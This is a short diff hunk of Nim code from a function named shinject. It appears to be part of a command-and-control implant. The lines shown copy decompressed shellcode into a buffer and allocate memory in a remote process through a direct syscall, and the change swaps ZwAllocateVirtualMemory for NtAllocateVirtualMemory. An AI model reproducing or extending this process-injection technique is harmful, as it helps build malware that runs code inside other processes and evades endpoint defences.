@@ -95,7 +95,7 @@ proc shinject*(li : webClientListener.Listener, args : seq[string]) : string =
     copyMem(shellcode[0].addr, decompressed[0].addr, decompressed.len)
 
     # Allocate memory in remote process
-    status = syscall(ZwAllocateVirtualMemory,
+    status = syscall(NtAllocateVirtualMemory,
         hProcess,
         addr allocAddr,
         0,
